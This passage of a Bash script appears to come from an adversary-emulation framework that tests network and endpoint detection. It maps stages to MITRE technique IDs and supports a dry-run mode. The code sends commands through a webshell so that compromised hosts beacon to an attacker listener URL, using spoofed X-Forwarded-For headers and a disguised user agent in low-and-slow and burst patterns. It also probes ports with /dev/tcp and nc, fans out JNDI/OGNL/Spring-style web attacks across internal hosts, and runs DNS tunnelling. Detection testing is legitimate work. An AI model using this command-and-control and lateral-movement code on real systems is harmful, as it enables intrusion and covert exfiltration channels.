    for ((c = 1; c <= chunks; c++)); do
        pipeline_stop_requested && break
        [[ "${remaining}" -lt 1 ]] && break
        this_chunk="${chunk_size}"
        [[ "${remaining}" -lt "${chunk_size}" ]] && this_chunk="${remaining}"
        chunk_out=$(run_webshell_long "fanout-${host}-${port}-${c}" \
            "$(build_fanout_chunk_cmd "${host}" "${port}" "${scheme}" "${this_chunk}" "${campaign}")" 2>/dev/null || true)
        ingest_http_attack_remote_output "${chunk_out}" "${host}"
        read -r chunk_at chunk_resp chunk_conn chunk_j chunk_o chunk_sp <<< "$(parse_fanout_chunk_stats_line "${chunk_out}")"
        sanitize_stats_ints chunk_at chunk_resp chunk_conn chunk_j chunk_o chunk_sp
        total_a=$((total_a + chunk_at))
        total_r=$((total_r + chunk_resp))
        total_c=$((total_c + chunk_conn))
        total_j=$((total_j + chunk_j))
        total_o=$((total_o + chunk_o))
        total_sp=$((total_sp + chunk_sp))
        remaining=$((remaining - this_chunk))
        state_append "internal_fanout_waves.log" "host=${host} port=${port} chunk=${c} attempted=${chunk_at} responses=${chunk_resp} out=$(printf '%.120s' "${chunk_out}")"
    done
    if (( total_a == 0 && req > 0 )); then
        chunk_out=$(run_webshell_quick "fanout-probe-${host}-${port}" "$(build_fanout_single_probe_cmd "${host}" "${port}" "${scheme}" "${campaign}")" 2>/dev/null || true)
        ingest_http_attack_remote_output "${chunk_out}" "${host}"
        read -r chunk_at chunk_resp chunk_conn chunk_j chunk_o chunk_sp <<< "$(parse_fanout_chunk_stats_line "${chunk_out}")"
        sanitize_stats_ints chunk_at chunk_resp chunk_conn chunk_j chunk_o chunk_sp
        total_a="${chunk_at}"
        total_r="${chunk_resp}"
        total_c="${chunk_conn}"
        add_fallback_usage "Internal fanout: single-probe fallback for ${host}:${port}"
    fi
    printf 'FANOUT_STATS attempted=%s responses=%s connected=%s jndi=%s ognl=%s spring=%s\n' \
        "${total_a}" "${total_r}" "${total_c}" "${total_j}" "${total_o}" "${total_sp}"
}

poc_diagnose_external_callback_layers() {
    local host="$1" port="$2" out="$3" ok="$4"
    local dns="UNKNOWN" tcp="UNKNOWN" tls="N/A" http="UNKNOWN" cause="Unknown"
    if [[ "${ok}" == *"CB_OK"* ]]; then
        dns="PASS"; tcp="PASS"; http="PASS"; cause="Success"
        printf '%s' "${dns}|${tcp}|${tls}|${http}|${cause}"
        return 0
    fi
    out=$(printf '%s' "${out}" | tr '[:upper:]' '[:lower:]')
    if [[ "${out}" == *"could not resolve"* ]]; then
        dns="FAIL"; tcp="SKIP"; http="SKIP"; cause="DNS resolution failed"
    elif [[ "${out}" == *"timed out"* || "${out}" == *"timeout"* ]]; then
        dns="PASS"; tcp="FAIL"; http="SKIP"; cause="Likely firewall drop or routing blackhole"
        poc_failure_reason_bump "Firewall Drop (callback)" 1
    elif [[ "${out}" == *"connection refused"* ]]; then
        dns="PASS"; tcp="FAIL"; http="SKIP"; cause="TCP connection refused (listener down or wrong port)"
    elif [[ "${out}" == *"connection reset"* ]]; then
        dns="PASS"; tcp="FAIL"; http="SKIP"; cause="Connection reset by peer"
    else
        dns="PASS"; tcp="FAIL"; http="FAIL"; cause="No HTTP response from callback target"
        poc_failure_reason_bump "Callback unreachable" 1
    fi
    printf '%s' "${dns}|${tcp}|${tls}|${http}|${cause}"
}

execute_external_beacon_callback() {
    local seq="$1" path="$2" mode_tag="$3"
    local ua m reqid sess xff remote_curl out raw_req req body attacker_host attacker_port
    local -a xff_refs=("10.0.0.22" "10.0.0.33" "10.0.0.44" "10.0.0.55" "172.16.0.10")
    attacker_host="${ATTACKER_BASE_URL#http://}"
    attacker_host="${attacker_host%%:*}"
    attacker_port="${ATTACKER_BASE_URL##*:}"
    ua="TelemetryCollector/9.7"
    m="GET"
    reqid="${RANDOM}-${RANDOM}-${seq}"
    sess="ssn-${CAMPAIGN_ID}-${RANDOM}"
    xff="${xff_refs[RANDOM % ${#xff_refs[@]}]}"
    build_curl_common_args 3
    local -a curl_args=("${CURL_COMMON_ARGS[@]}" --request "${m}" --user-agent "${ua}"
        -H "X-Request-ID: ${reqid}" -H "X-Session-ID: ${sess}" -H "X-Forwarded-For: ${xff}"
        -H "X-PoC-Campaign: ${CAMPAIGN_ID}" -H "X-Callback-Mode: ${mode_tag}" -H "Connection: keep-alive")
    append_curl_telemetry_headers curl_args
    curl_args+=("${ATTACKER_BASE_URL}${path}?node=${seq}&j=${RANDOM}&sid=${sess}&sync=1&mode=${mode_tag}")
    if [[ "${HAS_curl:-false}" == true ]]; then
        remote_curl=$(build_remote_curl_invocation "${curl_args[@]}")
        out=$(run_webshell "ext-callback-${mode_tag}-${seq}" "${remote_curl} >/dev/null 2>&1 && echo CB_OK || echo CB_FAIL" 2>/dev/null || true)
    else
        req="${path}?node=${seq}&j=${RANDOM}&sid=${sess}&mode=${mode_tag}"
        raw_req="${m} ${req} HTTP/1.1\r\nHost: ${attacker_host}:${attacker_port}\r\nUser-Agent: ${ua}\r\nX-PoC-Campaign: ${CAMPAIGN_ID}\r\nX-Session-ID: ${sess}\r\nX-Forwarded-For: ${xff}\r\nConnection: keep-alive\r\n\r\n"
        out=$(run_webshell "ext-callback-raw-${mode_tag}-${seq}" "${REMOTE_SHELL_HELPERS} poc_http_send '${attacker_host}' '${attacker_port}' \"${raw_req}\" >/dev/null 2>&1 && echo CB_OK || echo CB_FAIL" 2>/dev/null || true)
    fi
    increment_beacon_attempt
    if [[ "${out}" == *"CB_OK"* ]]; then
        increment_beacon_success
        increment_beacon_count
        return 0
    fi
    return 1
}

run_beacon_mode_fast_safe() {
    local beacon_path="${CALLBACK_PREFIX}/check-in" count=0 success=0 failed=0 i ratio=0
    local min_b max_b
    min_b=$(safe_int "${FAST_SAFE_CALLBACK_BEACON_MIN:-5}")
    max_b=$(safe_int "${FAST_SAFE_CALLBACK_BEACON_MAX:-8}")
    (( max_b < min_b )) && max_b="${min_b}"
    count=$((min_b + RANDOM % (max_b - min_b + 1)))
    log_message "OK" "Beacon fast-safe: path=${beacon_path} planned=${count} (precheck ok, no burst loop)" >&2
    for ((i=1; i<=count; i++)); do
        pipeline_stop_requested && break
        if execute_external_beacon_callback "${i}" "${beacon_path}" "fast_safe"; then
            success=$((success + 1))
        else
            failed=$((failed + 1))
        fi
        sleep "$(awk -v min="1.5" -v max="4" 'BEGIN{srand(); printf "%.1f\n", min + rand()*(max-min)}')"
    done
    BEACON_LOW_SLOW_ATTEMPTED="${count}"
    BEACON_LOW_SLOW_SUCCESS="${success}"
    BEACON_LOW_SLOW_FAILED="${failed}"
    BEACON_BURST_ATTEMPTED=0
    BEACON_BURST_SUCCESS=0
    BEACON_BURST_FAILED=0
    (( count > 0 )) && ratio=$((success * 100 / count))
    log_beacon_summary "fast_safe" "${count}" "${success}" "${failed}" "${ratio}"
}

run_beacon_mode_low_and_slow() {
    local beacon_path="${CALLBACK_PREFIX}/check-in" count=0 success=0 failed=0 i ratio=0
    count=$((15 + RANDOM % 16))
    log_message "OK" "Beacon low_and_slow: path=${beacon_path} planned=${count} interval=3-10s" >&2
    for ((i=1; i<=count; i++)); do
        pipeline_stop_requested && break
        if execute_external_beacon_callback "${i}" "${beacon_path}" "low_and_slow"; then
            success=$((success + 1))
        else
            failed=$((failed + 1))
        fi
        sleep "$(awk -v min="3" -v max="10" 'BEGIN{srand(); printf "%.1f\n", min + rand()*(max-min)}')"
    done
    BEACON_LOW_SLOW_ATTEMPTED="${count}"
    BEACON_LOW_SLOW_SUCCESS="${success}"
    BEACON_LOW_SLOW_FAILED="${failed}"
    (( count > 0 )) && ratio=$((success * 100 / count))
    log_beacon_summary "low_and_slow" "${count}" "${success}" "${failed}" "${ratio}"
}

run_beacon_mode_burst() {
    local beacon_path="${CALLBACK_PREFIX}/check-in" count=0 success=0 failed=0 i ratio=0
    local window_sec=0 t0=0 t1=0 elapsed=0 sleep_sec=0
    count=$((30 + RANDOM % 71))
    window_sec=$((30 + RANDOM % 91))
    t0=$(date +%s)
    log_message "OK" "Beacon burst: path=${beacon_path} planned=${count} window=${window_sec}s" >&2
    for ((i=1; i<=count; i++)); do
        pipeline_stop_requested && break
        t1=$(date +%s)
        elapsed=$((t1 - t0))
        (( elapsed >= window_sec )) && break
        if execute_external_beacon_callback "${i}" "${beacon_path}" "burst"; then
            success=$((success + 1))
        else
            failed=$((failed + 1))
        fi
        (( count > 1 )) && sleep_sec=$((window_sec / count))
        (( sleep_sec < 1 )) && sleep_sec=1
        sleep "${sleep_sec}"
    done
    BEACON_BURST_ATTEMPTED="${count}"
    BEACON_BURST_SUCCESS="${success}"
    BEACON_BURST_FAILED="${failed}"
    (( count > 0 )) && ratio=$((success * 100 / count))
    log_beacon_summary "burst" "${count}" "${success}" "${failed}" "${ratio}"
    CORRELATION_BEACON_CYCLES=$((success / 3 + 1))
}

poc_callback_run_precheck() {
    local target="$1" host="" port="" tcp_ok=no http_ok=no http_status="" reason=""
    host="${target#http://}"
    host="${host%%:*}"
    port="${target##*:}"
    [[ "${port}" == "${target}" || "${port}" == *"/"* ]] && port="${ATTACKER_PORT:-8080}"
    CALLBACK_PRECHECK_TCP_OK=no
    CALLBACK_PRECHECK_HTTP_OK=no
    log_message "OK" "CALLBACK_PRECHECK_START target=${host}:${port}" >&2
    if command -v timeout >/dev/null 2>&1; then
        if timeout 3 bash -c "echo >/dev/tcp/${host}/${port}" 2>/dev/null; then
            tcp_ok=yes
            reason=connected
        else
            reason=connection_refused_or_timeout
        fi
    elif command -v nc >/dev/null 2>&1; then
        if nc -z -w3 "${host}" "${port}" 2>/dev/null; then
            tcp_ok=yes
            reason=connected
        else
            reason=nc_probe_failed
        fi
    else
        reason=no_local_tcp_probe_tool
    fi
    CALLBACK_PRECHECK_TCP_OK="${tcp_ok}"
    log_message "OK" "CALLBACK_TCP_RESULT ok=${tcp_ok} reason=${reason}" >&2
    if command -v curl >/dev/null 2>&1; then
        http_status=$(curl --silent --show-error --max-time 5 --connect-timeout 3 -o /dev/null -w '%{http_code}' "${ATTACKER_BASE_URL}/check-in" 2>/dev/null || printf '000')
        [[ "${http_status}" =~ ^[23] ]] && http_ok=yes
        log_message "OK" "CALLBACK_HTTP_RESULT ok=${http_ok} status=${http_status}" >&2
    else
        log_message "OK" "CALLBACK_HTTP_RESULT ok=no status=000" >&2
    fi
    CALLBACK_PRECHECK_HTTP_OK="${http_ok}"
    if [[ "${tcp_ok}" == yes && "${http_ok}" == yes ]]; then
        log_message "OK" "CALLBACK_CLASSIFICATION result=success" >&2
        return 0
    elif [[ "${tcp_ok}" == no && "${http_ok}" == no ]]; then
        log_message "OK" "CALLBACK_CLASSIFICATION result=environment_issue" >&2
        return 1
    fi
    log_message "OK" "CALLBACK_CLASSIFICATION result=environment_issue" >&2
    return 0
}

poc_emit_callback_diagnostic() {
    local target="$1" out="${2:-}" ok="${3:-}" root_cause="" dns_res=no tcp_con=no http_con=no resp=no
    local host="${target#http://}" port="" layers="" dns="" tcp="" http="" cause=""
    host="${host%%:*}"
    port="${target##*:}"
    [[ "${port}" == "${target}" || "${port}" == *"/"* ]] && port="${ATTACKER_PORT:-8080}"
    if [[ -z "${out}" && "${ok}" != *"CB_OK"* && ( "${CALLBACK_PRECHECK_TCP_OK:-}" == yes || "${CALLBACK_PRECHECK_TCP_OK:-}" == no ) ]]; then
        dns_res=yes
        [[ "${CALLBACK_PRECHECK_TCP_OK}" == yes ]] && tcp_con=yes || tcp_con=no
        if [[ "${CALLBACK_PRECHECK_HTTP_OK}" == yes ]]; then
            http_con=yes
            resp=yes
        else
            http_con=no
            resp=no
        fi
        if [[ "${tcp_con}" == no && "${http_con}" == no ]]; then
            root_cause=listener_unreachable
        elif [[ "${tcp_con}" == no ]]; then
            root_cause=firewall_block
        elif [[ "${http_con}" == no ]]; then
            root_cause=listener_http_unreachable
        fi
    else
        layers=$(poc_diagnose_external_callback_layers "${host}" "${port}" "${out}" "${ok}")
        IFS='|' read -r dns tcp _http cause <<< "${layers}"
        case "${dns}" in
            PASS|yes) dns_res=yes ;;
            FAIL|no) dns_res=no ;;
            *) dns_res=unknown ;;
        esac
        case "${tcp}" in
            PASS|yes) tcp_con=yes ;;
            FAIL|no) tcp_con=no ;;
            SKIP) tcp_con=no ;;
            *) tcp_con=unknown ;;
        esac
        case "${_http}" in
            PASS|yes) http_con=yes; resp=yes ;;
            FAIL|no) http_con=no; resp=no ;;
            *) http_con=unknown; resp=no ;;
        esac
        [[ "${ok}" == *"CB_OK"* ]] && { resp=yes; root_cause=success; }
        [[ -z "${root_cause}" ]] && case "${cause}" in
            *DNS*) root_cause=dns_resolution_failed ;;
            *firewall*|*blackhole*|*timed*) root_cause=firewall_block ;;
            *refused*) root_cause=listener_down ;;
            *reset*) root_cause=connection_reset ;;
            *) root_cause=firewall_block ;;
        esac
    fi
    local msg="CALLBACK_DIAGNOSTIC target=${host}:${port} dns_resolution=${dns_res} tcp_connect=${tcp_con} http_connect=${http_con} response_received=${resp} timeout=5 root_cause=${root_cause}"
    state_append "external_callback.log" "${msg}"
    log_message "OK" "${msg}" >&2
}


stage_external_callback() {
    local attempted=0 connected=0 responses=0 attacker_host attacker_port cb_ratio=0 stage_duration=0 t0=0 t1=0
    add_executed_stage "External Callback"
    write_report_entries "external_callback" "T1071.001" "NDR/EDR" "External Callback" "${ATTACKER_BASE_URL}" "start" "attacker listener callback"
    attacker_host="${ATTACKER_BASE_URL#http://}"
    attacker_host="${attacker_host%%:*}"
    attacker_port="${ATTACKER_BASE_URL##*:}"
    EXTERNAL_CALLBACK_ATTEMPTED=0
    EXTERNAL_CALLBACK_CONNECTED=0
    EXTERNAL_CALLBACK_RESPONSES=0
    EXTERNAL_CALLBACK_FAILED=false
    CORRELATION_BEACON_CYCLES=0
    BEACON_LOW_SLOW_ATTEMPTED=0
    BEACON_LOW_SLOW_SUCCESS=0
    BEACON_LOW_SLOW_FAILED=0
    BEACON_BURST_ATTEMPTED=0
    BEACON_BURST_SUCCESS=0
    BEACON_BURST_FAILED=0

    log_message "OK" "External Callback: concentrated beacon on ${CALLBACK_PREFIX}/check-in (low_and_slow + burst modes)"
    log_message "OK" "CALLBACK_ATTEMPTED target=${attacker_host}:${attacker_port}"
    state_append "external_callback.log" "CALLBACK_ATTEMPTED target=${attacker_host}:${attacker_port}"
    if ! poc_callback_run_precheck "${ATTACKER_BASE_URL}"; then
        if [[ "${CALLBACK_PRECHECK_TCP_OK}" == no && "${CALLBACK_PRECHECK_HTTP_OK}" == no ]]; then
            if [[ "${FAST_SAFE_MODE}" == true ]]; then
                EXTERNAL_CALLBACK_SKIP_REASON="listener_unreachable_or_blocked"
            else
                EXTERNAL_CALLBACK_SKIP_REASON="listener_unreachable"
            fi
            EXTERNAL_CALLBACK_STATUS="skipped"
            EXTERNAL_CALLBACK_ATTEMPTED=0
            EXTERNAL_CALLBACK_CONNECTED=0
            EXTERNAL_CALLBACK_RESPONSES=0
            log_message "WARN" "CALLBACK_FAILED reason=${EXTERNAL_CALLBACK_SKIP_REASON} tcp_ok=${CALLBACK_PRECHECK_TCP_OK} http_ok=${CALLBACK_PRECHECK_HTTP_OK}" >&2
            state_append "external_callback.log" "CALLBACK_FAILED reason=${EXTERNAL_CALLBACK_SKIP_REASON} tcp_ok=${CALLBACK_PRECHECK_TCP_OK} http_ok=${CALLBACK_PRECHECK_HTTP_OK}"
            log_message "WARN" "EXTERNAL_CALLBACK_SKIPPED reason=${EXTERNAL_CALLBACK_SKIP_REASON} (TCP and HTTP precheck failed for ${attacker_host}:${attacker_port})" >&2
            state_append "external_callback.log" "EXTERNAL_CALLBACK_SKIPPED reason=${EXTERNAL_CALLBACK_SKIP_REASON} tcp_ok=${CALLBACK_PRECHECK_TCP_OK} http_ok=${CALLBACK_PRECHECK_HTTP_OK}"
            set_stage_result "External Callback" "Skipped" "Environment Issue: listener unreachable"
            poc_emit_callback_diagnostic "${ATTACKER_BASE_URL}" "" "CB_FAIL"
            write_report_entries "external_callback" "T1071.001" "NDR/EDR" "External Callback" "${ATTACKER_BASE_URL}" "skipped" "listener_unreachable"
            save_external_callback_overlap_result
            return 0
        fi
    fi
    if [[ "${DRY_RUN}" == true ]]; then
        BEACON_LOW_SLOW_ATTEMPTED=20
        BEACON_LOW_SLOW_SUCCESS=18
        BEACON_LOW_SLOW_FAILED=2
        BEACON_BURST_ATTEMPTED=60
        BEACON_BURST_SUCCESS=55
        BEACON_BURST_FAILED=5
        log_beacon_summary "low_and_slow" "${BEACON_LOW_SLOW_ATTEMPTED}" "${BEACON_LOW_SLOW_SUCCESS}" "${BEACON_LOW_SLOW_FAILED}" "90"
        log_beacon_summary "burst" "${BEACON_BURST_ATTEMPTED}" "${BEACON_BURST_SUCCESS}" "${BEACON_BURST_FAILED}" "91"
        EXTERNAL_CALLBACK_ATTEMPTED=$((BEACON_LOW_SLOW_ATTEMPTED + BEACON_BURST_ATTEMPTED))
        EXTERNAL_CALLBACK_CONNECTED=$((BEACON_LOW_SLOW_SUCCESS + BEACON_BURST_SUCCESS))
        EXTERNAL_CALLBACK_RESPONSES="${EXTERNAL_CALLBACK_CONNECTED}"
        EXTERNAL_CALLBACK_STATUS="success"
        CORRELATION_BEACON_CYCLES=5
        CORRELATION_CALLBACK_DONE=true
        compute_detection_score_beacon
        set_stage_result "External Callback" "Success" "dry-run concentrated beacon"
        save_external_callback_overlap_result
        return 0
    fi

    t0=$(date +%s)
    if [[ "${FAST_SAFE_MODE}" == true ]]; then
        run_beacon_mode_fast_safe
    else
        run_beacon_mode_low_and_slow
        run_beacon_mode_burst
    fi
    t1=$(date +%s)
    stage_duration=$((t1 - t0))
    attempted=$((BEACON_LOW_SLOW_ATTEMPTED + BEACON_BURST_ATTEMPTED))
    connected=$((BEACON_LOW_SLOW_SUCCESS + BEACON_BURST_SUCCESS))
    responses="${connected}"
    EXTERNAL_CALLBACK_ATTEMPTED="${attempted}"
    EXTERNAL_CALLBACK_CONNECTED="${connected}"
    EXTERNAL_CALLBACK_RESPONSES="${responses}"
    CORRELATION_CALLBACK_DONE=true
    (( attempted > 0 )) && cb_ratio=$((connected * 100 / attempted))
    BEACON_CALLBACK_RATIO="${cb_ratio}"
    if (( responses == 0 )); then
        EXTERNAL_CALLBACK_FAILED=true
        EXTERNAL_CALLBACK_STATUS="failed"
        log_message "WARN" "CALLBACK_FAILED attempted=${attempted} connected=0"
        state_append "external_callback.log" "CALLBACK_FAILED attempted=${attempted} connected=0"
        log_message "WARN" "External Callback complete: attempted=${attempted} connected=${connected} (callback unreachable — likely firewall TCP/${attacker_port})"
        poc_obs_log "SUMMARY" "External Callback Failure Analysis Target=${attacker_host}:${attacker_port} Likely Cause=Firewall Drop or listener unreachable"
    else
        EXTERNAL_CALLBACK_STATUS="success"
        log_message "OK" "CALLBACK_CONNECTED count=${connected}"
        state_append "external_callback.log" "CALLBACK_CONNECTED count=${connected}"
        log_message "OK" "CALLBACK_RESPONDED count=${responses}"
        state_append "external_callback.log" "CALLBACK_RESPONDED count=${responses}"
        log_message "OK" "External Callback complete: attempted=${attempted} connected=${connected} low_slow=${BEACON_LOW_SLOW_SUCCESS}/${BEACON_LOW_SLOW_ATTEMPTED} burst=${BEACON_BURST_SUCCESS}/${BEACON_BURST_ATTEMPTED}"
    fi
    log_detection_quality "External Callback" "${attempted}" "${stage_duration}" "${ATTACKER_BASE_URL}" \
        "beacon_concentrated" "$([[ "${connected}" -ge 20 ]] && printf high || ([[ "${connected}" -ge 5 ]] && printf medium || printf low))" \
        "${connected} callbacks on single path within ${stage_duration}s"
    compute_detection_score_beacon
    set_stage_result "External Callback" "$([[ "${EXTERNAL_CALLBACK_STATUS}" == success ]] && printf Success || printf Partial)" \
        "attempted=${attempted} connected=${connected} low_slow=${BEACON_LOW_SLOW_SUCCESS}/${BEACON_LOW_SLOW_ATTEMPTED} burst=${BEACON_BURST_SUCCESS}/${BEACON_BURST_ATTEMPTED}"
    write_report_entries "external_callback" "T1071.001" "NDR/EDR" "External Callback" "${ATTACKER_BASE_URL}" "success" "callback done"
    save_external_callback_overlap_result
}

stage_internal_web_fanout() {
    local targets target_line host port scheme req_per_host total_targets=0 planned=0
    local stats attempted=0 responses connected n
    targets=$(collect_internal_fanout_targets)
    total_targets=$(count_hosts_blob "${targets}")
    INTERNAL_FANOUT_TARGETS="${total_targets}"
    if [[ -z "${targets}" || "${total_targets}" == 0 ]]; then
        INTERNAL_FANOUT_STATUS="skipped"
        add_skipped_stage "Internal Web Fanout" "No HTTP/HTTPS fanout targets"
        set_stage_result "Internal Web Fanout" "Skipped" "no web targets"
        save_internal_fanout_overlap_result
        return 0
    fi
    add_executed_stage "Internal Web Fanout"
    req_per_host="${INTERNAL_FANOUT_PER_TARGET}"
    planned=$((total_targets * req_per_host))
    INTERNAL_FANOUT_ATTEMPTED=0
    INTERNAL_FANOUT_CONNECTED=0
    INTERNAL_FANOUT_RESPONSES=0
    log_message "OK" "Internal Web Fanout: targets=${total_targets} requests_per_host=${req_per_host} planned=${planned}"
    if [[ "${DRY_RUN}" == true ]]; then
        INTERNAL_FANOUT_ATTEMPTED="${planned}"
        INTERNAL_FANOUT_CONNECTED="${planned}"
        INTERNAL_FANOUT_RESPONSES="${planned}"
        INTERNAL_FANOUT_STATUS="success"
        set_stage_result "Internal Web Fanout" "Success" "dry-run planned ${planned}"
        save_internal_fanout_overlap_result
        return 0
    fi
    if [[ "${HAS_curl:-false}" != true ]]; then
        log_message "WARN" "Internal Web Fanout: remote curl missing — limited fanout"
        add_fallback_usage "Internal web fanout: remote curl missing"
    fi
    while IFS= read -r target_line; do
        [[ -z "${target_line}" ]] && continue
        pipeline_stop_requested && break
        if read -r host port scheme <<< "$(web_target_parse_line "${target_line}" "http" 2>/dev/null)"; then
            :
        elif read -r host port scheme <<< "$(web_target_parse_line "${target_line}" "https" 2>/dev/null)"; then
            :
        else
            continue
        fi
        if [[ "${HAS_curl:-false}" == true ]]; then
            stats=$(execute_internal_fanout_chunked "${host}" "${port}" "${scheme}" "${req_per_host}" "${CAMPAIGN_ID}")
            read -r n responses connected jndi ognl spring <<< "$(parse_fanout_stats_line "${stats}")"
            if (( n == 0 )); then
                stats=$(run_webshell_long "fanout-mono-${host}-${port}" "$(build_internal_fanout_curl_cmd "${host}" "${port}" "${req_per_host}" "${scheme}" "${CAMPAIGN_ID}")" 2>/dev/null || true)
                ingest_http_attack_remote_output "${stats}" "${host}"
                read -r n responses connected jndi ognl spring <<< "$(parse_fanout_stats_line "${stats}")"
            fi
            sanitize_stats_ints n responses connected jndi ognl spring
            attempted=$((attempted + n))
            INTERNAL_FANOUT_RESPONSES=$((INTERNAL_FANOUT_RESPONSES + responses))
            INTERNAL_FANOUT_CONNECTED=$((INTERNAL_FANOUT_CONNECTED + connected))
            FANOUT_UA_JNDI_STYLE_COUNT=$((FANOUT_UA_JNDI_STYLE_COUNT + jndi))
            FANOUT_UA_OGNL_STYLE_COUNT=$((FANOUT_UA_OGNL_STYLE_COUNT + ognl))
            FANOUT_UA_SPRING_STYLE_COUNT=$((FANOUT_UA_SPRING_STYLE_COUNT + spring))
        fi
    done <<< "${targets}"
    INTERNAL_FANOUT_ATTEMPTED="${attempted}"
    INTERNAL_FANOUT_STATUS=$(internal_fanout_stage_status)
    log_message "OK" "Internal Web Fanout complete: targets=${INTERNAL_FANOUT_TARGETS} attempted=${INTERNAL_FANOUT_ATTEMPTED} connected=${INTERNAL_FANOUT_CONNECTED} responses=${INTERNAL_FANOUT_RESPONSES} status=${INTERNAL_FANOUT_STATUS} jndi_ua=${FANOUT_UA_JNDI_STYLE_COUNT} ognl_ua=${FANOUT_UA_OGNL_STYLE_COUNT} spring_ua=${FANOUT_UA_SPRING_STYLE_COUNT}"
    if (( INTERNAL_FANOUT_TARGETS > 0 && INTERNAL_FANOUT_ATTEMPTED == 0 )); then
        set_stage_result "Internal Web Fanout" "Failed" "INTERNAL FANOUT EXECUTION FAILURE — targets=${INTERNAL_FANOUT_TARGETS} attempted=0"
        log_message "ERROR" "INTERNAL FANOUT EXECUTION FAILURE — targets=${INTERNAL_FANOUT_TARGETS} attempted=0"
    else
        set_stage_result "Internal Web Fanout" "$([[ "${INTERNAL_FANOUT_STATUS}" == success ]] && printf Success || printf Partial)" "fanout attempted=${INTERNAL_FANOUT_ATTEMPTED} status=${INTERNAL_FANOUT_STATUS}"
    fi
    write_report_entries "internal_fanout" "T1071.001" "NDR/WAF" "Internal Callback Fanout" "multi" "success" "internal fanout"
    save_internal_fanout_overlap_result
}

stage_dns_tunnel_enhanced() {
    if fast_safe_mode_enabled 2>/dev/null && [[ "${FAST_SAFE_SKIP_DNS_WORKER:-false}" == true ]]; then
        add_executed_stage "DNS Tunnel Enhanced"
        set_stage_result "DNS Tunnel Enhanced" "Skipped" "fast-safe fail-fast: dns_server_count=0"
        log_message "WARN" "FAST_SAFE_FAIL_FAST module=dns dns_server_count=0"
        return 0
    fi
    local count="${DNS_TUNNEL_QUERY_COUNT}" sim_rc=0 dns_probe_server=""
    add_executed_stage "DNS Tunnel Enhanced"
    write_report_entries "dns_tunnel_enhanced" "T1071.004" "NDR/SIEM" "DNS Tunnel" "${TARGET_NET}" "start" "Stellar-pattern DNS tunnel simulation"
    count=$(safe_int "${count}")
    (( count < DNS_TUNNEL_MIN_QUERIES )) && count="${DNS_TUNNEL_MIN_QUERIES}"
    DNS_QUERIES_PLANNED="${count}"
    reset_dns_tunnel_enhanced_fallback_stats
    reset_dns_tunnel_execution_stats
    log_message "OK" "DNS Tunnel Enhanced: planned=${DNS_QUERIES_PLANNED} idx queries (dns_tunnel_file_client)"
    if [[ "${DRY_RUN}" == true ]]; then
        run_dns_tunnel_simulation "${count}" "${DNS_TUNNEL_MODE}" || true
        snapshot_dns_tunnel_enhanced_run_stats 0 true
        record_dns_tunnel_enhanced_result
        record_dns_tunnel_fallback_result
        apply_dns_tunnel_enhanced_final_decision
        followup_record_dns "${DNS_QUERIES_ATTEMPTED:-0}"
        case "${DNS_TUNNEL_FINAL_RESULT:-failed}" in
            success) set_stage_result "DNS Tunnel Enhanced" "Success" "dry-run enhanced_attempted=${DNS_TUNNEL_ENH_ATTEMPTED}" ;;
            partial) set_stage_result "DNS Tunnel Enhanced" "Partial" "dry-run ${DNS_TUNNEL_FINAL_REASON}" ;;
            skipped) set_stage_result "DNS Tunnel Enhanced" "Skipped" "dry-run ${DNS_TUNNEL_FINAL_REASON}" ;;
            *) set_stage_result "DNS Tunnel Enhanced" "Failed" "dry-run ${DNS_TUNNEL_FINAL_REASON:-no_queries}" ;;
        esac
        save_dns_tunnel_overlap_result
        poc_run_dns_tunnel_live_log_validation || true
        return 0
    fi
    run_dns_tunnel_simulation "${count}" "${DNS_TUNNEL_MODE}" && sim_rc=0 || sim_rc=$?
    snapshot_dns_tunnel_enhanced_run_stats "${sim_rc}" true
    record_dns_tunnel_enhanced_result
    DNS_TUNNEL_FB_USED="no"
    DNS_TUNNEL_FB_REASON="enhanced_success"
    DNS_TUNNEL_FB_RESULT="skipped"
    record_dns_tunnel_fallback_result
    followup_record_dns "${DNS_QUERIES_ATTEMPTED:-0}"
    apply_dns_tunnel_enhanced_final_decision
    log_dns_tunnel_final_summary "${DNS_TUNNEL_FINAL_RESULT:-failed}"
    log_message "OK" "DNS Tunnel Enhanced complete: planned=${DNS_QUERIES_PLANNED} attempted=${DNS_QUERIES_ATTEMPTED} enhanced=${DNS_TUNNEL_ENH_ATTEMPTED} final=${DNS_TUNNEL_FINAL_RESULT} targets=${DNS_TUNNEL_FILE_TARGETS:-n/a}"
    write_report_entries "dns_tunnel_enhanced" "T1071.004" "NDR/SIEM" "DNS Tunnel" "${TARGET_NET}" "${DNS_TUNNEL_FINAL_RESULT:-failed}" "enhanced dns simulation final=${DNS_TUNNEL_FINAL_RESULT:-failed}"
    if fast_safe_mode_enabled 2>/dev/null && [[ "${DNS_ENVIRONMENT_BLOCKED}" != true ]]; then
        fast_safe_run_dns_detection_bundle "${DNS_TUNNEL_FILE_TARGETS:-${DNS_TARGET_SERVER:-}}" || true
    fi
    case "${DNS_TUNNEL_FINAL_RESULT:-failed}" in
        success) set_stage_result "DNS Tunnel Enhanced" "Success" "enhanced_attempted=${DNS_TUNNEL_ENH_ATTEMPTED}" ;;
        partial) set_stage_result "DNS Tunnel Enhanced" "Partial" "${DNS_TUNNEL_FINAL_REASON}" ;;
        skipped) set_stage_result "DNS Tunnel Enhanced" "Skipped" "${DNS_TUNNEL_FINAL_REASON}" ;;
        *) set_stage_result "DNS Tunnel Enhanced" "Failed" "${DNS_TUNNEL_FINAL_REASON:-no_queries}" ;;
    esac
    save_dns_tunnel_overlap_result
    poc_run_dns_tunnel_live_log_validation || true
}


stage_nonstandard_port_followup() {
    local hosts host port ports ephemeral ports_cmd out connections=0 wave
    local -a fixed_ports=(5985 5986 8888 9000 10443 18080 31337)
    local -a ephemeral_ports=(49152 49500 50000 55000 60000 65000)
    add_executed_stage "Non-Standard Port Follow-up"
    write_report_entries "nonstandard_port" "T1046" "NDR" "Non-Standard Port Anomaly" "multi" "start" "wave reconnect probes"
    NONSTANDARD_PORT_CONNECTIONS=0
    hosts=$(collect_nonstandard_port_hosts)
    log_message "OK" "Non-Standard Port follow-up: hosts=$(count_hosts_blob "${hosts}") fixed_ports=${#fixed_ports[@]} ephemeral_ports=${#ephemeral_ports[@]}"
    if [[ "${DRY_RUN}" == true ]]; then
        NONSTANDARD_PORT_CONNECTIONS=$(( $(count_hosts_blob "${hosts}") * (${#fixed_ports[@]} + ${#ephemeral_ports[@]}) * 3 ))
        (( NONSTANDARD_PORT_CONNECTIONS < 1 )) && NONSTANDARD_PORT_CONNECTIONS=42
